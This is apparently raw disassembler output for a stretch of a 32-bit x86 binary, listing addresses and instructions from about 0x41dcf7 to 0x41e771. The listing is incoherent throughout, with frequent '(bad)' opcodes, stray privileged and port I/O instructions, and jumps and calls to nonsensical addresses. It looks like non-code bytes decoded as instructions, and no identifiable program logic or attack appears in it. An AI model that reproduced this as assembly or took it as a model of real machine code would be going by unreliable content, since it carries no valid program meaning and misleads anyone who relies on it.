  41dcf7:	aam    0x67
  41dcf9:	(bad)  
  41dcfa:	inc    esi
  41dcfb:	mov    ?,WORD PTR [edx+0x423fdd8d]
  41dd01:	icebp  
  41dd02:	mov    edi,0x16e6ab9d
  41dd07:	stc    
  41dd08:	lods   eax,DWORD PTR ds:[esi]
  41dd09:	iret   
  41dd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd0b:	sub    BYTE PTR [edi],0xfe
  41dd0e:	fistp  WORD PTR [eax+ecx*4+0x21]
  41dd12:	enter  0x5cc,0xcf
  41dd16:	dec    ebx
  41dd17:	ja     0x41dd37
  41dd19:	pop    ecx
  41dd1a:	outs   dx,BYTE PTR ds:[esi]
  41dd1b:	or     edx,0xe731d6a
  41dd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd22:	adc    esp,esp
  41dd24:	or     BYTE PTR [esi-0x6],bl
  41dd27:	push   ebx
  41dd28:	sbb    DWORD PTR [edi-0x23],0x8cf7750d
  41dd2f:	sti    
  41dd30:	out    dx,eax
  41dd31:	push   0x9b144b2c
  41dd36:	dec    ecx
  41dd37:	jle    0x41dd10
  41dd39:	int3   
  41dd3a:	and    DWORD PTR [edi-0x65764d1a],0x78
  41dd41:	add    eax,0xbb1ec89
  41dd46:	xor    ebp,esi
  41dd48:	cmp    DWORD PTR [ebx-0x6a],ebp
  41dd4b:	xchg   ebp,eax
  41dd4c:	pop    esi
  41dd4d:	nop
  41dd4e:	ins    DWORD PTR es:[edi],dx
  41dd4f:	dec    ebx
  41dd50:	push   ss
  41dd51:	push   esp
  41dd52:	adc    eax,0x5142687d
  41dd57:	(bad)  
  41dd58:	xor    esi,DWORD PTR [bp+si]
  41dd5b:	fst    DWORD PTR [edx-0x43ae37bb]
  41dd61:	push   0xc9f263c8
  41dd66:	and    bl,ch
  41dd68:	popa   
  41dd69:	retf   0xad89
  41dd6c:	jo     0x41ddb7
  41dd6e:	and    eax,0x708466da
  41dd73:	inc    eax
  41dd74:	sbb    al,0x6
  41dd76:	pop    edx
  41dd77:	push   edi
  41dd79:	nop
  41dd7a:	jmp    0xac59d0ef
  41dd7f:	imul   esi,DWORD PTR [esi],0x1abf7567
  41dd85:	clc    
  41dd86:	daa    
  41dd87:	pop    ebx
  41dd88:	xchg   edx,eax
  41dd89:	aam    0x18
  41dd8b:	push   eax
  41dd8c:	xor    DWORD PTR [eax+0x524a4005],ebx
  41dd92:	jae    0x41dd2d
  41dd94:	xor    eax,DWORD PTR [esi-0x2549ce2e]
  41dd9a:	push   ecx
  41dd9b:	or     ebx,ecx
  41dd9d:	fdivr  QWORD PTR [ecx-0x19]
  41dda0:	nop
  41dda1:	cmp    ebx,DWORD PTR [edx-0x21]
  41dda4:	pop    esi
  41dda5:	sbb    BYTE PTR [eax],0x42
  41dda8:	stos   DWORD PTR es:[edi],eax
  41dda9:	bound  ecx,QWORD PTR [edi+0x1577f66d]
  41ddaf:	mov    dl,0x76
  41ddb1:	lods   al,BYTE PTR ds:[esi]
  41ddb2:	int    0xcb
  41ddb4:	arpl   WORD PTR [eax+0x75],ax
  41ddb7:	loop   0x41dd42
  41ddb9:	xchg   ebx,eax
  41ddba:	mov    bl,bl
  41ddbc:	fistp  QWORD PTR [edi+eax*2+0x6b9069]
	...
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	fstp   TBYTE PTR [eax+0x41cc15b7]
  41de46:	add    DWORD PTR [eax],eax
  41de48:	test   BYTE PTR [eax],0x0
  41de4b:	add    bh,ch
  41de4d:	mov    eax,0x603c89ff
  41de52:	arpl   si,cx
  41de54:	add    BYTE PTR [edi],dh
  41de56:	stos   BYTE PTR es:[edi],al
  41de57:	sahf   
  41de58:	push   cs
  41de59:	and    ebp,DWORD PTR [edi+eax*2+0x41]
  41de5d:	xchg   ecx,eax
  41de5e:	push   0x3
  41de60:	ret    
  41de61:	std    
  41de62:	js     0x41de65
  41de64:	jmp    0xb02:0xc2b35597
  41de6b:	xor    DWORD PTR [esi+0x7f35d4e4],0xffffffd0
  41de72:	cwde   
  41de73:	pop    es
  41de74:	call   0xd75eb8f1
  41de79:	frstor ds:0x422c030d
  41de7f:	hlt    
  41de80:	fdiv   QWORD PTR [ebx-0x30]
  41de83:	cmp    BYTE PTR ds:0x6ecc6da3,cl
  41de89:	ret    
  41de8a:	and    BYTE PTR [eax+0x4416c78b],ah
  41de90:	jmp    0x41df02
  41de92:	mov    eax,0x640e11b0
  41de97:	dec    ecx
  41de98:	sub    ecx,ebp
  41de9a:	xlat   BYTE PTR ds:[ebx]
  41de9b:	mov    ch,0xa
  41de9d:	cmp    BYTE PTR [esi+0x35e2a07f],bh
  41dea3:	mov    bl,0xcc
  41dea5:	cmp    eax,0x2e6442f1
  41deaa:	pop    ecx
  41deab:	push   ss
  41deac:	push   edx
  41dead:	das    
  41deae:	and    ecx,DWORD PTR [edi+0x4e]
  41deb1:	in     eax,dx
  41deb2:	stc    
  41deb3:	imul   esp,DWORD PTR [ebp-0x25],0x2c
  41deb7:	push   edx
  41deb8:	or     cl,BYTE PTR ds:0x77d561a8
  41debe:	pop    esp
  41debf:	sbb    esp,esp
  41dec1:	repnz and dh,0x20
  41dec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec6:	push   ebx
  41dec7:	sti    
  41dec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dec9:	test   BYTE PTR [ebx+ecx*4-0x44608449],al
  41ded0:	xchg   cl,dh
  41ded2:	call   0x5461:0xf77aad56
  41ded9:	xor    al,0x1a
  41dedb:	or     esp,DWORD PTR [ebx-0x289ffdcf]
  41dee1:	mov    edx,0x675f15f8
  41dee6:	add    eax,0x1d33a631
  41deeb:	scas   al,BYTE PTR es:[edi]
  41deec:	cs push edi
  41deee:	mov    dh,0x9f
  41def0:	xchg   BYTE PTR [esi-0x5a25560f],ch
  41def6:	out    dx,eax
  41def7:	dec    eax
  41def8:	lea    ecx,ds:0xc98d0878
  41defe:	jl     0x41dec4
  41df00:	js     0x41df2a
  41df02:	cli    
  41df03:	pop    ecx
  41df04:	pop    eax
  41df05:	xlat   BYTE PTR ds:[ebx]
  41df06:	(bad)  
  41df07:	retf   
  41df08:	sub    DWORD PTR ds:0x5676eeac,edx
  41df0e:	push   cs
  41df0f:	retf   0x65a4
  41df12:	cmp    dh,BYTE PTR [ebp+0x49]
  41df15:	cdq    
  41df16:	or     ah,al
  41df18:	jl     0x41df86
  41df1a:	sbb    eax,0x5f422c21
  41df1f:	pop    ebx
  41df20:	retf   0x5389
  41df23:	ficomp DWORD PTR [eax+0x5929220]
  41df29:	iret   
  41df2a:	(bad)  
  41df2b:	mov    eax,ds:0x558bf796
  41df30:	jg     0x41df23
  41df32:	dec    ebp
  41df33:	repz xor al,0xf
  41df36:	int    0xab
  41df38:	mov    DWORD PTR [ebx-0x2a],edx
  41df3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df3c:	int3   
  41df3d:	out    dx,eax
  41df3e:	scas   al,BYTE PTR es:[edi]
  41df3f:	je     0x41ded4
  41df41:	add    eax,0x0
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	sub    DWORD PTR [esi+0x76],esp
  41dfc3:	inc    esp
  41dfc4:	ret    0x142
  41dfc7:	add    dh,dh
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    cl,al
  41dfcd:	xor    ah,0x71
  41dfd0:	rcl    BYTE PTR [edi-0x1634b2cc],0x3a
  41dfd7:	add    BYTE PTR [ebx+0x5d08f80e],0xb
  41dfde:	and    BYTE PTR [ebx-0x2],0x65
  41dfe2:	and    esp,esp
  41dfe4:	(bad)
  41dfe7:	in     eax,dx
  41dfe8:	and    DWORD PTR [edx-0x78],edx
  41dfeb:	mov    esp,0x193bf613
  41dff0:	(bad)  [edi+0x51]
  41dff3:	nop
  41dff4:	adc    ebx,DWORD PTR ds:0xbd2c95d2
  41dffa:	sbb    eax,DWORD PTR [ebx-0x3ad70f94]
  41e000:	retf   0xb36b
  41e003:	mov    al,0x24
  41e005:	and    eax,DWORD PTR [edx]
  41e007:	jl     0x41dfbc
  41e009:	push   edi
  41e00a:	pusha  
  41e00b:	pop    esp
  41e00c:	sar    DWORD PTR [ebp-0x3e],cl
  41e00f:	jo     0x41dfb7
  41e011:	add    ah,BYTE PTR [edx+0x77]
  41e014:	add    ah,BYTE PTR [ebx+eax*8-0x4c1dc28a]
  41e01b:	loope  0x41dfb3
  41e01d:	std    
  41e01e:	add    DWORD PTR [edx-0x143f199f],0xffffffa9
  41e025:	stos   BYTE PTR es:[edi],al
  41e026:	add    al,0xdc
  41e028:	mov    eax,0x753ec802
  41e02d:	mov    ecx,0xd5095a5e
  41e032:	and    dl,dh
  41e034:	jmp    0x41e007
  41e036:	inc    edx
  41e037:	daa    
  41e038:	dec    edi
  41e039:	add    eax,0x13dbf839
  41e03e:	lea    eax,[ebp-0x2e2aeb46]
  41e044:	jle    0x41dfcc
  41e046:	out    dx,eax
  41e047:	jbe    0x41dff2
  41e049:	ins    DWORD PTR es:[edi],dx
  41e04a:	fiadd  WORD PTR [edi-0x61]
  41e04d:	pop    edx
  41e04e:	sbb    cl,cl
  41e050:	add    dh,BYTE PTR [edi-0x23a6ad2f]
  41e056:	mov    al,0x3b
  41e058:	xor    eax,0x1b11b831
  41e05d:	xchg   DWORD PTR [edx+0x6e],ebp
  41e060:	leave  
  41e061:	adc    ch,al
  41e063:	cmc    
  41e064:	add    ecx,esi
  41e066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e067:	or     DWORD PTR [esi],esi
  41e069:	aas    
  41e06a:	jg     0x41e042
  41e06c:	push   ebp
  41e06d:	fucomp st(4)
  41e06f:	mov    bl,0xd0
  41e071:	sub    BYTE PTR [ecx+0x487ecc9d],bl
  41e077:	arpl   WORD PTR [edx-0x5142e9ca],bx
  41e07d:	push   es
  41e07e:	cld    
  41e07f:	mov    bl,0x7c
  41e081:	or     DWORD PTR [edi],ebp
  41e083:	push   ds
  41e084:	call   0x8933f75d
  41e089:	mov    DWORD PTR [ecx],edi
  41e08b:	push   ebx
  41e08c:	pusha  
  41e08d:	test   al,0xd2
  41e08f:	jl     0x41e065
  41e091:	popf   
  41e092:	sub    DWORD PTR [eax],ebx
  41e094:	outs   dx,DWORD PTR cs:[esi]
  41e096:	pusha  
  41e097:	(bad)  
  41e098:	mov    bl,0xd8
  41e09a:	pop    edi
  41e09b:	mov    dh,0xc3
  41e09d:	xchg   DWORD PTR ds:0x1eddac36,ecx
  41e0a3:	push   0xffffffca
  41e0a5:	loop   0x41e02b
  41e0a7:	pop    ds
  41e0a8:	mov    DWORD PTR [ebx+0x522cfed8],ecx
  41e0ae:	out    0xb6,eax
  41e0b0:	lea    edx,[ecx-0x6e727d40]
  41e0b6:	jmp    FWORD PTR [ecx]
  41e0b8:	sub    al,BYTE PTR [ecx+0x955574e]
  41e0be:	idiv   BYTE PTR [ebx-0x70]
  41e0c1:	nop
	...
  41e132:	add    BYTE PTR [eax],al
  41e134:	push   eax
  41e135:	ret    
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	jb     0x41e1a8
  41e142:	fst    DWORD PTR [ecx]
  41e144:	mov    eax,0xf6000143
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    bh,cl
  41e14d:	add    al,0xaf
  41e14f:	into   
  41e150:	ss clc 
  41e152:	jge    0x41e106
  41e154:	sbb    bl,BYTE PTR [ebx]
  41e156:	lds    ebx,FWORD PTR [ebx]
  41e158:	push   0xffffffb5
  41e15a:	or     DWORD PTR [ebx-0x21],ebx
  41e15d:	scas   eax,DWORD PTR es:[edi]
  41e15e:	sbb    bh,BYTE PTR [edx]
  41e160:	or     cx,WORD PTR [edx-0x62aae6ea]
  41e167:	xor    dh,bh
  41e169:	xor    ah,al
  41e16b:	les    ecx,FWORD PTR [ebp+0x3933466d]
  41e171:	es cmc 
  41e173:	push   ds
  41e174:	in     al,0xdc
  41e176:	dec    esp
  41e177:	cld    
  41e178:	pop    ss
  41e179:	test   al,0x3b
  41e17b:	push   edi
  41e17c:	js     0x41e118
  41e17e:	jns    0x41e150
  41e180:	mov    ds:0x17be8d20,al
  41e185:	adc    ch,dl
  41e187:	sbb    bh,BYTE PTR [esi-0x42]
  41e18a:	or     edx,ecx
  41e18c:	dec    ecx
  41e18d:	test   BYTE PTR [ecx+0x47],al
  41e190:	fcomp  QWORD PTR [ecx]
  41e192:	jecxz  0x41e131
  41e194:	neg    BYTE PTR [esi]
  41e196:	or     al,0x7c
  41e198:	or     eax,0x402a8f4f
  41e19d:	jge    0x41e1dd
  41e19f:	mov    es,WORD PTR [ecx+edx*4]
  41e1a2:	mov    ds:0xba8c11b5,eax
  41e1a7:	and    ecx,DWORD PTR [ebx]
  41e1a9:	xor    al,0x43
  41e1ab:	stos   BYTE PTR es:[edi],al
  41e1ac:	aad    0x5b
  41e1ae:	test   al,0xea
  41e1b0:	sub    ebp,edi
  41e1b2:	repnz out 0x98,al
  41e1b5:	in     eax,0x3e
  41e1b7:	popa   
  41e1b8:	sahf   
  41e1b9:	mov    eax,ds:0x2015a4d1
  41e1be:	js     0x41e231
  41e1c0:	inc    esp
  41e1c1:	lock out 0x22,al
  41e1c4:	retf   0xb55b
  41e1c7:	dec    ebp
  41e1c8:	retf   
  41e1c9:	jecxz  0x41e208
  41e1cb:	mov    ds:0x3a8b406f,al
  41e1d0:	fist   DWORD PTR [edi+ebx*2]
  41e1d3:	mov    esp,?
  41e1d5:	pop    ecx
  41e1d6:	pushf  
  41e1d7:	je     0x41e215
  41e1d9:	cmp    BYTE PTR [edx],ch
  41e1db:	push   edi
  41e1dc:	and    ah,BYTE PTR [ecx-0x7d]
  41e1df:	dec    eax
  41e1e0:	mov    ah,0x1a
  41e1e2:	(bad)
  41e1e7:	xlat   BYTE PTR ds:[ebx]
  41e1e8:	(bad)  
  41e1ea:	mov    ds:0x298e204a,al
  41e1ef:	pop    ecx
  41e1f0:	ja     0x41e26a
  41e1f2:	add    dh,BYTE PTR [esp+esi*8]
  41e1f5:	(bad)  
  41e1f6:	retf   0x9fd6
  41e1f9:	sbb    eax,0x22418a9c
  41e1fe:	pusha  
  41e1ff:	aam    0x79
  41e201:	xchg   ebp,eax
  41e202:	cli    
  41e203:	cdq    
  41e204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e205:	xor    esi,DWORD PTR [esi]
  41e207:	call   0x6cba883a
  41e20c:	scas   eax,DWORD PTR es:[edi]
  41e20d:	imul   ecx,DWORD PTR [ebx],0x3fe25c3c
  41e213:	jmp    0x41e228
  41e215:	inc    edx
  41e216:	push   ebp
  41e217:	pop    ebx
  41e218:	sbb    al,0x30
  41e21a:	mov    dl,0x3e
  41e21c:	stos   DWORD PTR es:[edi],eax
  41e21d:	fdiv   QWORD PTR [edi-0x5d63d9c0]
  41e223:	popf   
  41e224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e225:	adc    eax,edx
  41e227:	sahf   
  41e228:	shl    BYTE PTR [ebx+0x76],cl
  41e22b:	(bad)  
  41e22d:	jp     0x41e1c3
  41e22f:	shr    BYTE PTR [esi],cl
  41e231:	push   cs
  41e232:	mov    BYTE PTR [ecx],0x46
  41e235:	jmp    0x41e269
  41e237:	and    DWORD PTR [esi],ebp
  41e239:	push   ss
  41e23a:	mov    ch,bl
  41e23c:	lock mov esp,0x9f5feda7
	...
  41e2b2:	add    BYTE PTR [eax],al
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	bound  edx,QWORD PTR [eax+0x44aed416]
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	test   BYTE PTR [eax],0x0
  41e2cb:	add    BYTE PTR ds:0xa02cc1aa,dl
  41e2d1:	push   ebx
  41e2d2:	sbb    cx,WORD PTR [eax+edi*8-0x78]
  41e2d7:	out    0x41,al
  41e2d9:	int    0x7b
  41e2db:	rcl    BYTE PTR [ecx],1
  41e2dd:	sub    DWORD PTR [ebx+0x2b],esi
  41e2e0:	rcl    WORD PTR [edi-0x77e3914],0x78
  41e2e8:	pop    ebp
  41e2e9:	repnz mov al,ds:0x6f77cbb6
  41e2ef:	ds icebp 
  41e2f1:	cmp    dl,BYTE PTR [esi]
  41e2f3:	pop    ds
  41e2f4:	cli    
  41e2f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2f6:	mov    BYTE PTR fs:0xc3f4488b,bl
  41e2fd:	xchg   BYTE PTR ss:[eax+0x226d50c5],cl
  41e304:	repz sbb BYTE PTR [edi],cl
  41e307:	repz retf 
  41e309:	jp     0x41e327
  41e30b:	or     dl,0x6c
  41e30e:	adc    ecx,esi
  41e310:	cmp    eax,0xc134917a
  41e315:	shl    dh,cl
  41e317:	xchg   esp,eax
  41e318:	(bad)  
  41e319:	shl    BYTE PTR [ecx-0x1405c846],1
  41e31f:	sub    al,0x41
  41e321:	retf   
  41e322:	fld    QWORD PTR [ebx]
  41e324:	aam    0x24
  41e326:	outs   dx,BYTE PTR ds:[esi]
  41e327:	(bad)  
  41e328:	out    0xb7,al
  41e32a:	xchg   ecx,eax
  41e32b:	mov    ebp,0xda19f05f
  41e330:	push   0x65bddb9d
  41e335:	adc    ecx,ebp
  41e337:	arpl   sp,bp
  41e339:	adc    eax,esp
  41e33b:	ins    BYTE PTR es:[di],dx
  41e33d:	lock cmp BYTE PTR [ebx+0x49],bh
  41e341:	or     al,0x7f
  41e343:	xor    ecx,0x92f2a19c
  41e349:	scas   al,BYTE PTR es:[edi]
  41e34a:	inc    ecx
  41e34b:	shr    ch,cl
  41e34d:	xor    al,0x86
  41e34f:	ret    
  41e350:	retf   
  41e351:	dec    esi
  41e352:	jnp    0x41e360
  41e354:	mov    eax,ds:0x2d4c3bca
  41e359:	inc    eax
  41e35a:	push   es
  41e35b:	pop    esp
  41e35c:	bound  ecx,QWORD PTR [edx-0x5912d447]
  41e362:	lahf   
  41e363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e364:	jmp    0x495bff7f
  41e369:	outs   dx,BYTE PTR ds:[esi]
  41e36a:	shr    edx,cl
  41e36c:	and    dh,BYTE PTR [ecx+0x3e]
  41e36f:	pop    ds
  41e370:	std    
  41e371:	jns    0x41e3bb
  41e373:	add    al,cl
  41e375:	pop    ds
  41e376:	xor    al,BYTE PTR ds:0x7e9e3868
  41e37c:	cs (bad) 
  41e37e:	xor    al,0xae
  41e380:	loop   0x41e38f
  41e382:	mov    esi,0x27cac441
  41e387:	fwait
  41e388:	into   
  41e389:	repnz adc dh,BYTE PTR [eax+0x1eb4269e]
  41e390:	push   cs
  41e391:	jle    0x41e32e
  41e393:	in     eax,0xad
  41e395:	xchg   esi,eax
  41e396:	add    edx,DWORD PTR [ebx+0x8]
  41e399:	je     0x41e348
  41e39b:	int    0x2d
  41e39d:	push   0xffffffe9
  41e39f:	test   eax,0xec3c5e87
  41e3a4:	out    dx,al
  41e3a5:	jo     0x41e3d6
  41e3a7:	into   
  41e3a8:	stc    
  41e3a9:	into   
  41e3aa:	sbb    ebp,edi
  41e3ac:	and    al,0x8d
  41e3ae:	dec    esp
  41e3af:	fisubr DWORD PTR [ecx]
  41e3b1:	push   ecx
  41e3b2:	stc    
  41e3b3:	sub    bh,ah
  41e3b5:	loopne 0x41e378
  41e3b7:	(bad)  
  41e3b8:	bswap  edx
  41e3ba:	ror    BYTE PTR [ebp+edi*4+0x6e],0x26
  41e3bf:	jl     0x41e38c
  41e3c1:	dec    ecx
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x84c9fead,al
  41e442:	pusha  
  41e443:	cmp    BYTE PTR [ebp+eax*2+0xf60001],ah
  41e44a:	add    BYTE PTR [eax],al
  41e44c:	ficom  WORD PTR [ecx+ecx*8-0x53]
  41e450:	sub    BYTE PTR [ebp-0x36df5364],0xf5
  41e457:	(bad)  
  41e458:	pop    ebp
  41e459:	(bad)  
  41e45d:	pop    ecx
  41e45e:	fsubr  DWORD PTR [ebx-0x61]
  41e461:	scas   eax,DWORD PTR es:[edi]
  41e462:	lds    ecx,FWORD PTR [ecx]
  41e464:	out    0x8a,al
  41e466:	xchg   esp,eax
  41e467:	or     al,0xf6
  41e469:	arpl   WORD PTR [esp+eax*1],bp
  41e46c:	ret    
  41e46d:	cmp    DWORD PTR [edi-0x2cca28e7],ebx
  41e473:	or     DWORD PTR [edi-0x80],ebp
  41e476:	ud1    esi,DWORD PTR [edx+0x751cb8c2]
  41e47d:	mov    bh,0x2
  41e47f:	sbb    DWORD PTR [edi],eax
  41e481:	scas   eax,DWORD PTR es:[edi]
  41e482:	int3   
  41e483:	mov    bh,BYTE PTR [ebx]
  41e485:	xchg   ebx,eax
  41e486:	(bad)  
  41e487:	pop    eax
  41e488:	push   edi
  41e489:	sti    
  41e48a:	rcr    DWORD PTR [edx+eiz*1],cl
  41e48d:	rol    BYTE PTR [esi],cl
  41e48f:	mov    ds:0xa58e7065,eax
  41e494:	pop    ecx
  41e495:	mov    ds:0x250a82bb,eax
  41e49a:	push   esp
  41e49b:	dec    esi
  41e49c:	lods   al,BYTE PTR ds:[esi]
  41e49d:	in     al,0x7e
  41e49f:	popa   
  41e4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4a1:	mov    dh,0x5f
  41e4a3:	cli    
  41e4a4:	sbb    DWORD PTR [ecx],ecx
  41e4a6:	inc    ebp
  41e4a7:	fld    DWORD PTR [eax+0x15c95644]
  41e4ad:	ss xchg ebx,ebp
  41e4b0:	imul   eax,DWORD PTR [eax],0xd2979082
  41e4b6:	mov    ch,0x2
  41e4b8:	adc    dh,BYTE PTR [ebp+0x72b02d45]
  41e4be:	je     0x41e538
  41e4c0:	pop    ds
  41e4c1:	nop
  41e4c2:	xor    ebx,esi
  41e4c4:	out    dx,eax
  41e4c5:	jecxz  0x41e479
  41e4c7:	adc    ah,al
  41e4c9:	(bad)  
  41e4ca:	fsubrp st(6),st
  41e4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4cd:	push   es
  41e4ce:	or     BYTE PTR [edi+edi*1+0x79],bh
  41e4d2:	aas    
  41e4d3:	aad    0x1d
  41e4d5:	rol    BYTE PTR [edi+0x44],1
  41e4d8:	push   0x43694ca3
  41e4dd:	mov    ds,WORD PTR [edx-0x50]
  41e4e0:	sbb    DWORD PTR [eax+0x78],esi
  41e4e3:	enter  0x7962,0xf2
  41e4e7:	(bad)  
  41e4e9:	sahf   
  41e4ea:	stc    
  41e4eb:	adc    ecx,DWORD PTR [ebx-0x28ac5ec3]
  41e4f1:	xor    eax,0x413eeb64
  41e4f6:	loopne 0x41e4be
  41e4f8:	sub    ebp,DWORD PTR [esi-0x3f27ac29]
  41e4fe:	inc    ebp
  41e4ff:	jb     0x41e51f
  41e501:	fnsave [ebx]
  41e503:	cli    
  41e504:	push   cs
  41e505:	(bad)  
  41e506:	stos   BYTE PTR es:[edi],al
  41e507:	arpl   WORD PTR [ebp+0x62ec75d9],bp
  41e50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e50e:	add    cl,BYTE PTR [ecx]
  41e510:	int3   
  41e511:	dec    ebx
  41e512:	mov    esi,0xa8e4c66e
  41e517:	and    dh,al
  41e519:	rol    DWORD PTR [ebx],0x61
  41e51c:	xor    ch,al
  41e51e:	push   esp
  41e51f:	imul   esp,DWORD PTR [eax+ecx*4],0xffffffbf
  41e523:	into   
  41e524:	push   0x947d365b
  41e529:	xchg   esp,eax
  41e52a:	ins    DWORD PTR es:[edi],dx
  41e52b:	pop    ebp
  41e52c:	cmp    DWORD PTR [ebx-0x7b7fb72a],eax
  41e532:	into   
  41e533:	daa    
  41e534:	repz das 
  41e536:	sbb    dh,cl
  41e538:	cli    
  41e539:	jno    0x41e519
  41e53b:	jo     0x41e4f1
  41e53d:	ds and edi,edx
  41e540:	call   0x0:0x3
	...
  41e5b3:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz push ds
  41e5c1:	mov    WORD PTR [edx],?
  41e5c3:	adc    DWORD PTR [edx-0x9fffeba],ebx
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [edi+esi*2+0x6af19ea],dl
  41e5d2:	(bad)  
  41e5d3:	lock and al,0x6b
  41e5d6:	push   ss
  41e5d7:	imul   edx,DWORD PTR [edx-0x602a44ff],0x67e9923d
  41e5e1:	imul   esi,DWORD PTR [ebx-0x7fd7fa68],0x7bdaca31
  41e5eb:	test   DWORD PTR [esi],0xdeb4610b
  41e5f1:	jle    0x41e5a3
  41e5f3:	add    BYTE PTR [ebx-0x2eee44fa],cl
  41e5f9:	out    0xee,eax
  41e5fb:	jecxz  0x41e5a3
  41e5fd:	lods   al,BYTE PTR ds:[esi]
  41e5fe:	add    al,0x3b
  41e600:	jo     0x41e67a
  41e602:	jne    0x41e639
  41e604:	add    eax,0x46f5d42f
  41e609:	ins    BYTE PTR es:[edi],dx
  41e60a:	dec    edx
  41e60b:	xor    eax,0x434790c
  41e610:	add    esp,DWORD PTR [edi+0x1b]
  41e613:	and    al,BYTE PTR [ebp+0x59]
  41e616:	pushf  
  41e617:	and    eax,0x5de97f9f
  41e61c:	and    BYTE PTR es:[ebp+0x41d28b92],bl
  41e623:	add    BYTE PTR [ecx],ah
  41e625:	pushf  
  41e626:	inc    ebp
  41e627:	fcomp  QWORD PTR [esi+eax*4]
  41e62a:	xchg   BYTE PTR [edx-0x2be0af4c],bl
  41e630:	aaa    
  41e631:	mov    edx,0xa8ca0a52
  41e636:	adc    cl,bl
  41e638:	inc    ecx
  41e639:	fstp   TBYTE PTR [ecx+0x66]
  41e63c:	adc    dl,BYTE PTR [edx+0x4d0093bb]
  41e642:	mov    WORD PTR [esi+edi*2-0x39],ss
  41e646:	cmp    eax,esi
  41e648:	ins    DWORD PTR es:[edi],dx
  41e649:	sub    al,0xf1
  41e64b:	jns    0x41e676
  41e64d:	retf   0xc24c
  41e650:	or     edx,DWORD PTR [ebx-0x60]
  41e653:	or     edx,DWORD PTR [ebx-0xc4b3e07]
  41e659:	mov    DWORD PTR ds:[ebx],esp
  41e65c:	adc    DWORD PTR [ecx+0x6b77ed13],ecx
  41e662:	xchg   ecx,eax
  41e663:	cmp    BYTE PTR [ecx-0x3af0f71c],ch
  41e669:	cmp    ecx,DWORD PTR [ecx]
  41e66b:	pop    eax
  41e66c:	pop    esp
  41e66d:	pop    esi
  41e66e:	call   0x13d:0xd425768
  41e675:	or     al,BYTE PTR [eax+ebp*8]
  41e678:	mov    dh,0xe
  41e67a:	sti    
  41e67b:	lods   eax,DWORD PTR ds:[esi]
  41e67c:	mov    esp,0x62c11bbf
  41e681:	pop    ss
  41e682:	outs   dx,DWORD PTR ds:[esi]
  41e683:	test   BYTE PTR [ebp-0x15ef12db],ch
  41e689:	sbb    DWORD PTR [esi+edi*2+0x72a132bf],ecx
  41e690:	jo     0x41e6fc
  41e692:	inc    eax
  41e693:	xchg   BYTE PTR [edx+ebx*8+0xed57753],bh
  41e69a:	loopne 0x41e65f
  41e69c:	scas   al,BYTE PTR es:[edi]
  41e69d:	sbb    eax,0xd19b3202
  41e6a2:	jmp    0x41e663
  41e6a4:	outs   dx,BYTE PTR ds:[esi]
  41e6a5:	cld    
  41e6a6:	sub    al,BYTE PTR [esi-0x7f9c4931]
  41e6ac:	aas    
  41e6ad:	lahf   
  41e6ae:	aaa    
  41e6af:	mov    edi,0x219a3ef2
  41e6b4:	mov    edx,0x11ff69e5
  41e6b9:	inc    esp
  41e6ba:	ror    DWORD PTR [eax+0x2c3759f7],1
  41e6c0:	xor    BYTE PTR [ebp+0x0],al
	...
  41e732:	add    BYTE PTR [eax],al
  41e734:	and    al,0xce
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x65f4b8b0]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    cl,ch
  41e74d:	adc    ch,bl
  41e74f:	pop    ebx
  41e750:	xchg   edx,eax
  41e751:	dec    ebp
  41e752:	out    0x90,eax
  41e754:	enter  0xdd89,0xd4
  41e758:	mov    dl,0xfe
  41e75a:	mov    al,0x96
  41e75c:	push   0xbe8d97c4
  41e761:	xor    BYTE PTR [esi],0xf3
  41e764:	fs mov al,0x3a
  41e767:	adc    DWORD PTR [edi+edx*1],0x27
  41e76b:	jnp    0x41e774
  41e76d:	retf   
  41e76e:	clc    
  41e76f:	xchg   edi,eax
  41e770:	pop    edi
  41e771:	cmp    ebx,ecx
